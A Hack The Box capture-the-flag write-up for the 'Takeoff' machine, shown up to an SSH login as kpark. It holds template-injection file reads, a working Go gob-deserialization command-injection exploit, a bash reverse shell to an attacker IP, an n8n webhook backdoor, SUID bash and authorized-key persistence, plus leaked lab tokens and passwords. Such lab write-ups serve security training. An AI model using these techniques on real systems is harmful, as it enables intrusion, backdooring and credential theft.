# Hack The Box — Takeoff (Writeup)

| Field | Value |
|-------|-------|
| **Name** | Takeoff |
| **Difficulty** | Hard |
| **OS** | Linux (Debian 13, kernel 6.12) |
| **IP** | 10.129.250.248 |
| **Hostname** | takeoff.htb |
| **User Flag** | `*******` |
| **Root Flag** | `*******` |

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| dirsearch / feroxbuster | Web directory brute-forcing |
| curl | HTTP requests (proxied through Burp on 127.0.0.1:8080) |
| Burp Suite | HTTP traffic interception and analysis |
| Go compiler | Building the gob deserialization exploit |
| UPX | Unpacking the packed Go binary |
| strings / grep | Binary analysis |
| Python 3 | Temporary HTTP server for file transfer |
| ssh-keygen | SSH key generation |

## Network Diagram

```
                                 ┌──────────────────────────────────────────────┐
                                 │              takeoff.htb (Host)              │
                                 │                                              │
  ┌──────┐    Port 80            │  ┌─────────┐        ┌──────────────────┐     │
  │ Kali ├───────────────────────┼──► nginx   ├────────► htb-air (Go)    │     │
  │      │    Port 22 (SSH)      │  └─────────┘  :3000  │  runs as www-data│     │
  │      ├───────────────────────┤                      │  Echo + HTMX     │     │
  └──────┘                       │                      └────────┬─────────┘     │
                                 │                               │               │
                                 │               ┌───────────────┼─────────┐     │
                                 │               │ 127.0.0.1:3306│         │     │
                                 │               ▼               ▼         │     │
                                 │          ┌─────────┐   ┌────────────┐   │     │
                                 │          │  MySQL   │   │ n8n Docker │   │     │
                                 │          │ (host)   │   │ :5678      │   │     │
                                 │          └─────────┘   │ 172.18.0.2 │   │     │
                                 │                        │ root user   │   │     │
                                 │                        │             │   │     │
                                 │                        │ /root = bind│   │     │
                                 │                        │ mount from  │   │     │
                                 │                        │ /home/kpark │   │     │
                                 │                        └─────────────┘   │     │
                                 └──────────────────────────────────────────┘     │
```

## System Users

| User | UID | Home | Notes |
|------|-----|------|-------|
| www-data | 33 | /var/www | Runs htb-air Go application via systemd |
| vmiller | 1000 | /home/vmiller | — |
| kpark | 1001 | /home/kpark | n8n admin, home dir bind-mounted into Docker |

## Credentials Discovered

| Credential | Source | Works For |
|------------|--------|-----------|
| `ctfplayer@htb.local` / `P4ssw0rd!123` | Registered by us | Web app login |
| `TICKET_VALIDATION_TOKEN` = `JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR` | LFI on /proc/self/environ | HMAC signing for check-in exploit |
| `N8N_API_KEY` = `eyJhbGciOiJIUzI1NiIs...RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo` | LFI on /proc/self/environ | n8n REST API authentication |
| `kpark@takeoff.htb` / `AFLpGlrx1XiMB88v` | n8n container env vars | n8n web UI only (NOT SSH, NOT su) |
| n8n encryption key = `YfpBa/9eifEvfvTjjJwVObCRyDx4HkHV` | n8n container /root/.n8n/config | Decrypting n8n credential store |

## Attack Chain Overview

```
Enumeration → SSTI/LFI → Binary Analysis → Gob Deserialization RCE (www-data)
    → n8n API → executeCommand (root in Docker) → User Flag
    → Docker bind-mount abuse → SUID bash + SSH key → Root
```

---

## 1. Enumeration

### 1.1 Port Scan

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.250.248
```

Relevant output:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
80/tcp   open  http    nginx
3000/tcp open  http    Golang net/http server
3306/tcp open  mysql   MySQL
5678/tcp open  http    Node.js (n8n)
```

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH — accepts password and publickey auth |
| 80 | HTTP | nginx reverse proxy, forwards to Go app on :3000 |
| 3000 | HTTP | Go application (HTB Airways) built with Echo framework |
| 3306 | MySQL | Bound to 127.0.0.1 only (not reachable externally) |
| 5678 | HTTP | n8n workflow automation, running in a Docker container |

### 1.2 Hostname Setup

```bash
echo '10.129.250.248 takeoff.htb' | sudo tee -a /etc/hosts
```

### 1.3 Web Application Discovery

Browsing to `http://takeoff.htb` reveals **HTB Airways**, an airline booking system. The site is built with:

- **Backend:** Go (Echo framework)
- **Frontend:** HTMX for dynamic partial page updates, server-side rendered Go `text/template` templates
- **Authentication:** JWT (HS256) stored in a cookie named `session_token`

#### Directory Enumeration

```bash
dirsearch -u http://takeoff.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Key endpoints discovered:

| Path | Description |
|------|-------------|
| `/` | Landing page with flight search |
| `/search` | Flight search results |
| `/book/start` | Begin booking flow |
| `/login` | Login page |
| `/register` | Registration page |
| `/dashboard` | Authenticated dashboard — shows trips, notifications |
| `/trips/:pnr` | View a specific trip/booking |
| `/tickets/:pnr/download` | Download ticket as PDF |
| `/profile` | User profile and password change |
| `/api/check-in` | QR-code check-in endpoint (POST) |
| `/boards` | Departure/arrival boards |

#### User Registration and Login

Navigate to `/register` and create an account:

```
Email:    ctfplayer@htb.local
Password: P4ssw0rd!123
```

After registration, log in at `/login`. The server sets a `session_token` cookie containing a JWT:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJleHAiOjE3OTU1Mjg5MjksImlhdCI6MTc5NTQ0MjUyOSwiaXNzIjoidGFrZW9mZi5odGIifQ.-LrSI1Nsu3b4R0UMF6FXzi3XKmMn5R9kngaGLigcMqw
```

Decoded JWT payload: `{"user_id":2,"exp":1795528929,"iat":1795442529,"iss":"takeoff.htb"}`

Save the cookie for later use:

```bash
# Save cookie to a file for curl
echo "takeoff.htb\tFALSE\t/\tFALSE\t0\tsession_token\t<JWT_VALUE>" > /tmp/cookies.txt
```

#### Booking Flow

1. Search for a flight on the landing page (pick origin, destination, date)
2. Select a flight from search results → redirects to `/book/start`
3. Enter passenger details and select a seat
4. Confirm booking → receive a **PNR code** (e.g., `KMS3MF`)
5. View the trip at `/trips/KMS3MF` — shows flight details, passenger info, and ticket
6. Download ticket PDF at `/tickets/KMS3MF/download`

The trip view page includes a **Notes** feature — a modal that lets users add text notes to their ticket. This is the SSTI entry point.

---

## 2. Server-Side Template Injection → Local File Inclusion

### 2.1 Discovering the SSTI

The ticket notes are rendered through Go's `text/template` engine on the server side. When you view a trip page or download the ticket PDF, any notes attached to the ticket are rendered through the template engine. The app does **not** sanitize user input in the notes field, allowing template injection.

Go's `text/template` supports calling methods on the template context object. The context object used for ticket rendering exposes a `.File` method that reads and returns file contents.

### 2.2 Adding a Malicious Note (SSTI Payload)

Notes are added via a POST request to the trip page. The exact endpoint and form:

```bash
# Add a note containing the SSTI payload
curl -s -b /tmp/cookies.txt \
  -x http://127.0.0.1:8080 \
  -X POST \
  "http://takeoff.htb/trips/KMS3MF" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'notes={{.File "/etc/passwd"}}'
```

**What's happening:**
- `POST /trips/KMS3MF` — submits a note to the booking with PNR `KMS3MF`
- `-b /tmp/cookies.txt` — sends the authenticated session cookie
- `-x http://127.0.0.1:8080` — proxies through Burp Suite for inspection
- The `notes` parameter contains `{{.File "/etc/passwd"}}` — a Go template directive that calls the `.File` method on the template context object with the path `/etc/passwd`

### 2.3 Triggering the Template Render

The SSTI payload is rendered when the notes are displayed. This happens when:
1. Viewing the trip page at `GET /trips/KMS3MF`
2. Downloading the ticket PDF at `GET /tickets/KMS3MF/download`

```bash
# Download the ticket PDF — the rendered note will contain /etc/passwd
curl -s -b /tmp/cookies.txt \
  -x http://127.0.0.1:8080 \
  "http://takeoff.htb/tickets/KMS3MF/download" \
  -o ticket.pdf
```

Open `ticket.pdf` and the contents of `/etc/passwd` appear in the notes section of the ticket. Alternatively, view the trip page HTML and look for the rendered output in the notes area.

### 2.4 Extracting Sensitive Files

Using the SSTI/LFI, we read critical files from the server.

#### Reading /proc/self/environ (Process Environment Variables)

Add a new note (or update the existing one):

```bash
curl -s -b /tmp/cookies.txt \
  -x http://127.0.0.1:8080 \
  -X POST \
  "http://takeoff.htb/trips/KMS3MF" \
  -d 'notes={{.File "/proc/self/environ"}}'
```

Then fetch the rendered output:

```bash
curl -s -b /tmp/cookies.txt \
  -x http://127.0.0.1:8080 \
  "http://takeoff.htb/trips/KMS3MF"
```

The environment variables are null-byte separated. The critical values:

```
TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo
```

#### Reading the systemd unit file

```bash
curl -s -b /tmp/cookies.txt -X POST \
  "http://takeoff.htb/trips/KMS3MF" \
  -d 'notes={{.File "/etc/systemd/system/htb-air.service"}}'
```

This reveals the service configuration:

```ini
[Service]
User=www-data
ExecStart=/opt/htb-airways/booking/htb-air
ProtectHome=true
PrivateTmp=true
ProtectSystem=strict
Requires=docker.service
```

Key implications:
- `ProtectHome=true` — `/home` is inaccessible from the www-data process and its children
- `PrivateTmp=true` — `/tmp` is a private mount, not shared with other services
- `Requires=docker.service` — the app depends on Docker (for the n8n container)

---

## 3. Binary Analysis

### 3.1 Locating the Binary

From the systemd unit, we know the binary is at `/opt/htb-airways/booking/htb-air`. We can read it via LFI but it's a binary file. First, let's check what it is:

```bash
curl -s -b /tmp/cookies.txt -X POST \
  "http://takeoff.htb/trips/KMS3MF" \
  -d 'notes={{.File "/opt/htb-airways/booking/htb-air"}}'
```

The output includes the string `$Info: This file is packed with the UPX executable packer http://upx.sf.net $` — the binary is UPX-packed, so `strings` on the raw file won't yield much useful information.

### 3.2 Transferring the Binary to Kali

The binary needs to be transferred to Kali for unpacking. Since the box doesn't have UPX installed, we transfer via our reverse shell (obtained later) or by base64 encoding:

```bash
# From the www-data reverse shell on the target:
base64 /opt/htb-airways/booking/htb-air > /dev/shm/htb-air.b64

# From Kali, retrieve it (or copy/paste from the shell):
base64 -d htb-air.b64 > /tmp/htb-air
```

### 3.3 Unpacking with UPX

```bash
upx -d /tmp/htb-air -o /tmp/htb-air-unpacked
```

Output:

```
                       Ultimate Packer for eXecutables
  File size         Ratio      Format      Name
  --------------------   ------   -----------   -----------
  12595200 <-   4972544   39.48%   linux/amd64   htb-air-unpacked

Unpacked 1 file.
```

The binary expands from ~5MB to ~12.6MB.

### 3.4 Extracting Key Strings

```bash
# Search for environment variable names and database-related strings
strings /tmp/htb-air-unpacked | grep -E 'DB_|TICKET_|N8N_|parseTime|gob\.'
```

Relevant findings:

```
DB_HOST
DB_PORT
DB_USER
DB_PASSWORD
DB_NAME
TICKET_VALIDATION_TOKEN
N8N_API_KEY
%s:%s@tcp(%s:%s)/%s?parseTime=true&charset=utf8mb4&collation=utf8mb4_unicode_ci
*gob.VerifyTicketAuthenticity
```

```bash
# Confirm the database name default
strings /tmp/htb-air-unpacked | grep -i takeoff | head -5
```

```
takeoff
takeoff.htb
takeoff_H
```

The app constructs its MySQL DSN from environment variables (`DB_USER:DB_PASSWORD@tcp(DB_HOST:DB_PORT)/DB_NAME`) with `takeoff` as the likely default database name.

The gob type name `*gob.VerifyTicketAuthenticity` tells us the struct name used for check-in QR data serialization. The `NotifyCmd` field in the JSON within that struct is passed to a shell for execution.

---

## 4. RCE via Gob Deserialization + Command Injection

### 4.1 Understanding the Check-In Flow

The `/api/check-in` endpoint processes QR code data for passenger check-in. The normal flow:

1. The app generates a QR code for each ticket containing a base64-encoded payload
2. The payload consists of **gob-encoded data** + **32-byte HMAC-SHA256 signature**
3. The gob data encodes an `interface{}` wrapping a `*VerifyTicketAuthenticity` struct
4. That struct contains a `Data` field holding JSON-encoded `TicketData`
5. `TicketData` has fields: `PNR`, `Token`, `Seat`, `Passenger`, `NotifyCmd`
6. After HMAC verification and deserialization, the app **executes `NotifyCmd` as a shell command**

The normal `NotifyCmd` value is something like:
```
check-in-notify --pnr KMS3MF --email ctfplayer@htb.local
```

Since we have the `TICKET_VALIDATION_TOKEN` (the HMAC signing key), we can craft payloads with arbitrary `NotifyCmd` values and sign them ourselves.

### 4.2 The Exploit

Save the following as `exploit.go`:

```go
package main

import (
        "bytes"
        "crypto/hmac"
        "crypto/sha256"
        "encoding/base64"
        "encoding/gob"
        "encoding/json"
        "fmt"
        "io"
        "net/http"
        "net/url"
        "os"
        "strings"
)

type VerifyTicketAuthenticity struct {
        Data []byte
}

type TicketData struct {
        PNR       string `json:"PNR"`
        Token     string `json:"Token"`
        Seat      string `json:"Seat"`
        Passenger string `json:"Passenger"`
        NotifyCmd string `json:"NotifyCmd"`
}

func init() {
        gob.RegisterName("*gob.VerifyTicketAuthenticity", &VerifyTicketAuthenticity{})
}

func main() {
        token := []byte("JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR")
        sessionCookie := "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJleHAiOjE3OTU1Mjg5MjksImlhdCI6MTc5NTQ0MjUyOSwiaXNzIjoidGFrZW9mZi5odGIifQ.-LrSI1Nsu3b4R0UMF6FXzi3XKmMn5R9kngaGLigcMqw"

        cmdArg := "id"
        if len(os.Args) > 1 {
                cmdArg = os.Args[1]
        }

        td := TicketData{
                PNR:       "KMS3MF",
                Token:     "fc9685eea733706a16684238a16f667c",
                Seat:      "11A",
                Passenger: "CTF Player",
                NotifyCmd: cmdArg,
        }
        newJSON, _ := json.Marshal(td)
        fmt.Fprintf(os.Stderr, "NotifyCmd: %s\n", td.NotifyCmd)

        newV := &VerifyTicketAuthenticity{Data: newJSON}
        var iface interface{} = newV
        var buf bytes.Buffer
        enc := gob.NewEncoder(&buf)
        enc.Encode(&iface)
        gobData := buf.Bytes()

        mac := hmac.New(sha256.New, token)
        mac.Write(gobData)
        sig := mac.Sum(nil)

        payload := append(gobData, sig...)
        b64Payload := base64.StdEncoding.EncodeToString(payload)

        formData := url.Values{}
        formData.Set("qr_data", b64Payload)
        formData.Set("gate", "WEB")

        req, _ := http.NewRequest("POST", "http://10.129.250.248/api/check-in", strings.NewReader(formData.Encode()))
        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        req.AddCookie(&http.Cookie{Name: "session_token", Value: sessionCookie})

        client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
                return http.ErrUseLastResponse
        }}
        resp, err := client.Do(req)
        if err != nil {
                fmt.Fprintf(os.Stderr, "HTTP error: %v\n", err)
                os.Exit(1)
        }
        defer resp.Body.Close()
        body, _ := io.ReadAll(resp.Body)
        fmt.Fprintf(os.Stderr, "Status: %d\n", resp.StatusCode)
        fmt.Fprintf(os.Stderr, "Location: %s\n", resp.Header.Get("Location"))
        fmt.Printf("%s\n", body)
}
```

**How the exploit works:**

1. Constructs a `TicketData` struct with our injected command in `NotifyCmd`
2. JSON-encodes it and wraps it in a `VerifyTicketAuthenticity` struct
3. Gob-encodes the struct as an `interface{}` (matching how the app registers the type)
4. Computes HMAC-SHA256 over the gob bytes using the leaked `TICKET_VALIDATION_TOKEN`
5. Appends the 32-byte HMAC to the gob data
6. Base64-encodes the whole thing and sends it as `qr_data` to `POST /api/check-in`

### 4.3 Running Commands and Reading Output

The command runs blind (no direct output in the HTTP response — the response is a redirect). To read output, we redirect to a file and use the SSTI/LFI to read it back:

```bash
# Step 1: Run a command and redirect output to /dev/shm/output
go run exploit.go 'check-in-notify; id > /dev/shm/output'

# Step 2: Read the output via SSTI/LFI
curl -s -b /tmp/cookies.txt -X POST \
  "http://takeoff.htb/trips/KMS3MF" \
  -d 'notes={{.File "/dev/shm/output"}}'

curl -s -b /tmp/cookies.txt "http://takeoff.htb/trips/KMS3MF"
# Output includes: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.4 Getting a Reverse Shell

```bash
# Terminal 1 — Start listener on Kali:
nc -lvnp 9001

# Terminal 2 — Fire the exploit:
go run exploit.go 'check-in-notify; bash -c "bash -i >& /dev/tcp/10.10.16.35/9001 0>&1"'
```

```
listening on [any] 9001 ...
connect to [10.10.16.35] from (UNKNOWN) [10.129.250.248] 45844
bash: cannot set terminal process group (1759): Inappropriate ioctl for device
bash: no job control in this shell
www-data@takeoff:/opt/htb-airways/booking$
```

We now have a shell as **www-data** on the host.

---

## 5. Lateral Movement: n8n Container RCE

### 5.1 Why n8n?

From the process environment, we have the `N8N_API_KEY`. The n8n instance runs on `127.0.0.1:5678` inside a Docker container. n8n is a workflow automation tool — if we can create a workflow with a command execution node, we get RCE inside the container.

### 5.2 Enumerating Existing Workflows

From the www-data shell:

```bash
curl -s -H "X-N8N-API-KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo" \
  http://127.0.0.1:5678/api/v1/workflows
```

Five existing workflows found (all inactive):
- **Check-In Notify** — Webhook-triggered, looks up booking in MySQL, sends notification
- **Daily Ops Summary** — Cron job, queries MySQL for daily stats
- **Booking Confirmation** — Webhook-triggered, confirms bookings
- **No-Show Detector** — Nightly job, voids unused tickets
- **Schedule Change Alerter** — Polls for cancelled flights every 10 minutes

All of these use `n8n-nodes-base.mySql` nodes, but the MySQL credentials are stored encrypted in n8n's credential store.

### 5.3 Failed Approaches

**Code node (sandbox restrictions):** n8n's Code node runs in a sandboxed VM. Attempting to use `process`, `require('child_process')`, or `require('fs')` all fail:

```
Error: process is not defined
Error: Code contained a require('child_process') call, which is not allowed
```

**Modifying existing MySQL workflows:** Updating a workflow via PUT strips credential bindings, breaking the MySQL connection. Creating new MySQL credentials via API worked, but connecting from the container to MySQL on the host failed — MySQL is bound to 127.0.0.1 on the host, unreachable from the container's network namespace.

### 5.4 Successful Approach: executeCommand Node

The `n8n-nodes-base.executeCommand` node runs shell commands directly — no sandbox restrictions. We create a new webhook-triggered workflow with this node.

**Create the workflow:**

```bash
curl -s -X POST http://127.0.0.1:5678/api/v1/workflows \
  -H "X-N8N-API-KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Flex",
    "nodes": [
      {
        "parameters": {
          "httpMethod": "GET",
          "path": "flex",
          "responseMode": "lastNode"
        },
        "id": "wh1",
        "name": "Webhook",
        "type": "n8n-nodes-base.webhook",
        "typeVersion": 2,
        "position": [200, 300],
        "webhookId": "flex"
      },
      {
        "parameters": {
          "command": "={{ $json.query.cmd }}"
        },
        "id": "exec1",
        "name": "Run",
        "type": "n8n-nodes-base.executeCommand",
        "typeVersion": 1,
        "position": [420, 300]
      }
    ],
    "connections": {
      "Webhook": {
        "main": [[{"node": "Run", "type": "main", "index": 0}]]
      }
    },
    "settings": {}
  }'
```

The API returns the created workflow with its ID (e.g., `abc123`).

**Activate the workflow:**

```bash
curl -s -X PUT "http://127.0.0.1:5678/api/v1/workflows/<WORKFLOW_ID>/activate" \
  -H "X-N8N-API-KEY: <N8N_API_KEY>"
```

### 5.5 Using the Backdoor

The workflow exposes a GET webhook at `/webhook/flex` that accepts a `cmd` query parameter. The `executeCommand` node runs that command and returns the output as JSON.

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=id"
```

Response:

```json
{"exitCode":0,"stderr":"","stdout":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(flock),20(dialout),26(tape),27(video)"}
```

We have **root** inside the n8n Docker container.

---

## 6. Container Enumeration → User Flag

### 6.1 Container Identity

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=hostname"
# {"exitCode":0,"stderr":"","stdout":"f1bfbbddcdd4"}

curl -s "http://127.0.0.1:5678/webhook/flex?cmd=hostname+-I"
# {"exitCode":0,"stderr":"","stdout":"172.18.0.2"}
```

The container is on the Docker network at **172.18.0.2** (gateway 172.18.0.1).

### 6.2 Environment Variables

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=env"
```

Key findings:

| Variable | Value |
|----------|-------|
| `N8N_BASIC_AUTH_USER` | `kpark@takeoff.htb` |
| `N8N_BASIC_AUTH_PASSWORD` | `AFLpGlrx1XiMB88v` |
| `N8N_USER_MANAGEMENT_DISABLED` | `true` |
| `N8N_BASIC_AUTH_ACTIVE` | `true` |
| `NODE_VERSION` | `24.15.0` |

### 6.3 Credential Reuse Attempts (Failed)

Tried kpark's n8n password for system access:

```bash
# From Kali — SSH as kpark
ssh kpark@10.129.250.248
# Password: AFLpGlrx1XiMB88v
# Result: Permission denied (publickey,password).

# From www-data shell — su to kpark
su - kpark
# Password: AFLpGlrx1XiMB88v
# Result: Authentication failure
```

The n8n basic auth password is **not** kpark's system password.

### 6.4 Filesystem Enumeration

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=ls+-la+/root/"
```

```
drwxr-xr-x    5 1001     1001          4096 Nov 23 09:59 .
drwxr-xr-x    1 root     root          4096 Jun 18 12:01 ..
drwxr-xr-x    4 root     root          4096 Nov 23 06:52 .n8n
-rw-r-----    1 root     1001            33 Nov 23 06:51 user.txt
```

Notice: `/root` is owned by **uid 1001** (kpark on the host), and `user.txt` is group-readable by gid 1001. This confirms `/root` in the container is a bind mount from `/home/kpark` on the host.

### 6.5 User Flag

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=cat+/root/user.txt"
```

```json
{"exitCode":0,"stderr":"","stdout":"cbcf53f421f1ec25ed4e0a4806f264e8"}
```

**User flag: `cb*******e8`**

### 6.6 n8n Encryption Key

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=cat+/root/.n8n/config"
```

```json
{"encryptionKey": "YfpBa/9eifEvfvTjjJwVObCRyDx4HkHV"}
```

This key is used to encrypt credentials stored in n8n's SQLite database (`/root/.n8n/database.sqlite`). We explored decrypting the MySQL credentials from the SQLite DB but ultimately found a more direct path to root.

---

## 7. Privilege Escalation: Container Escape → Root

### 7.1 Understanding the Mount Layout

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=cat+/proc/1/mountinfo+|+grep+sda4+|+head+-1"
```

```
314 294 8:4 /home/kpark /root rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
```

**Key insight:** The host's root partition (`/dev/sda4`, device major:minor `8:4`) has `/home/kpark` bind-mounted as `/root` inside the container. Anything we write to `/root` in the container appears in `/home/kpark` on the host.

### 7.2 Container Capabilities Analysis

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=cat+/proc/1/status+|+grep+Cap"
```

```
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
```

Decoding `0xa80425fb`:

| Capability | Present | Relevance |
|------------|---------|-----------|
| CAP_CHOWN | Yes | Can change file ownership |
| CAP_DAC_OVERRIDE | Yes | Bypass file read/write permission checks |
| CAP_FSETID | Yes | Can set SUID/SGID bits |
| CAP_FOWNER | Yes | Bypass permission checks on file owner |
| CAP_KILL | Yes | — |
| CAP_SETGID | Yes | Can change GID |
| CAP_SETUID | Yes | Can change UID |
| CAP_MKNOD | Yes | **Can create device nodes** |
| CAP_SYS_CHROOT | Yes | — |
| **CAP_SYS_ADMIN** | **No** | **Cannot mount filesystems** |

### 7.3 Why We Can't Just Access /home

The htb-air systemd service uses `ProtectHome=true`. This creates a mount namespace where `/home`, `/root`, and `/run/user` are replaced with empty, inaccessible directories. Our www-data reverse shell inherits this namespace:

```bash
www-data@takeoff:$ ls -la /home
ls: cannot open directory '/home': Permission denied
```

We can't directly read or write to `/home/kpark` from the www-data shell, even though we know it exists. We need a different path.

### 7.4 Failed Approach: Mounting the Host Filesystem

Since we have CAP_MKNOD, we can create the `/dev/sda4` block device:

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=mknod+/tmp/sda4+b+8+4"
# {"exitCode":0,"stderr":"","stdout":""}  — Success!
```

But mounting it fails because we lack CAP_SYS_ADMIN:

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=mount+/tmp/sda4+/mnt"
# {"message":"Error in workflow"}  — mount: permission denied (EPERM)
```

### 7.5 The Attack Plan

Since we can write to `/home/kpark` (via container's `/root`) but can't read `/home` from www-data, the plan is:

1. **Transfer the host's bash binary** into the container's `/root` (= `/home/kpark`)
2. **Set the SUID bit** on it (we're root in the container, so the file is owned by uid 0 = root on the host)
3. **Write an SSH public key** to `/root/.ssh/authorized_keys` (= `/home/kpark/.ssh/authorized_keys`)
4. **SSH as kpark** from Kali (bypasses ProtectHome — SSH starts a new session, not in the htb-air namespace)
5. **Execute the SUID bash** with `-p` flag to get root

### 7.6 Step A: Transfer Host Bash to Container

The container runs Alpine Linux with **musl libc**. The host runs Debian with **glibc**. If we used the container's `/bin/bash` (or `/bin/sh`), it would fail on the host due to the libc mismatch. We need the **host's** `/bin/bash` binary.

We use a temporary HTTP server on the host to serve the file, then download it in the container.

**On the www-data reverse shell (host side):**

```bash
cd /dev/shm && cp /bin/bash . && python3 -m http.server 8888 &
```

```
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

**Verify the container can reach the host:**

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=ip+route"
```

```json
{"exitCode":0,"stderr":"","stdout":"default via 172.18.0.1 dev eth0 \n172.18.0.0/16 dev eth0 scope link  src 172.18.0.2"}
```

The container's default gateway is **172.18.0.1** (the Docker bridge on the host).

**Download bash in the container:**

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=wget+http://172.18.0.1:8888/bash+-O+/root/bash"
```

```json
{"exitCode":0,"stderr":"Connecting to 172.18.0.1:8888 (172.18.0.1:8888)\nsaving to '/root/bash'\nbash                 100% |********************************| 1267k  0:00:00 ETA\n'/root/bash' saved","stdout":""}
```

The host's Python server confirms the request:

```
172.18.0.2 - - [23/Nov/2026 09:57:55] "GET /bash HTTP/1.1" 200 -
```

### 7.7 Step B: Set the SUID Bit

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=chmod+4755+/root/bash"
```

```json
{"exitCode":0,"stderr":"","stdout":""}
```

Since we're uid 0 (root) in the container, the file on the host becomes:
- **Owner:** root (uid 0)
- **Permissions:** `-rwsr-xr-x` (SUID set)

When kpark executes `./bash -p` on the host, bash will run with effective UID 0 (root).

### 7.8 Step C: Write SSH Key for kpark

Since `/root` in the container = `/home/kpark` on the host, we can write SSH authorized keys.

**Generate key on Kali:**

```bash
ssh-keygen -t ed25519 -f /tmp/kpark_key -N ""
cat /tmp/kpark_key.pub
```

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQkTDcZqj+bjigkimxosAb2qTasNldPOYeLm8GDZtzg kali@kali
```

**Write the key from the container:**

```bash
# Create .ssh directory
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=mkdir+-p+/root/.ssh"

# Set correct directory permissions
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=chmod+700+/root/.ssh"

# Write the public key (note: + in the key is URL-encoded as %2B)
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=echo+ssh-ed25519+AAAAC3NzaC1lZDI1NTE5AAAAIMQkTDcZqj%2BbjigkimxosAb2qTasNldPOYeLm8GDZtzg+kali@kali+>+/root/.ssh/authorized_keys"

# Set ownership to kpark (uid 1001) — SSH requires the key file to be owned by the target user
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=chown+-R+1001:1001+/root/.ssh"

# Set correct file permissions
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=chmod+600+/root/.ssh/authorized_keys"
```

**Verify:**

```bash
curl -s "http://127.0.0.1:5678/webhook/flex?cmd=cat+/root/.ssh/authorized_keys"
```

```json
{"exitCode":0,"stderr":"","stdout":"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQkTDcZqj+bjigkimxosAb2qTasNldPOYeLm8GDZtzg kali@kali"}
```

> **Important:** SSH is strict about permissions. The `.ssh` directory must be `700` and `authorized_keys` must be `600`, both owned by the target user. Without `chown 1001:1001`, SSH rejects the key with "Permission denied."

### 7.9 Step D: SSH as kpark and Get Root

```bash
ssh -i /tmp/kpark_key kpark@10.129.250.248
```

```
Linux takeoff.htb 6.12.113+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.113-1 (2026-10-15) x86_64
Last login: Mon Nov 23 10:01:48 2026 from 10.10.16.35
kpark@takeoff:~$
```

We're now logged in as **kpark** via SSH. SSH starts a fresh login session — it is NOT in the htb-air ProtectHome namespace, so we have full access to `/home/kpark`.

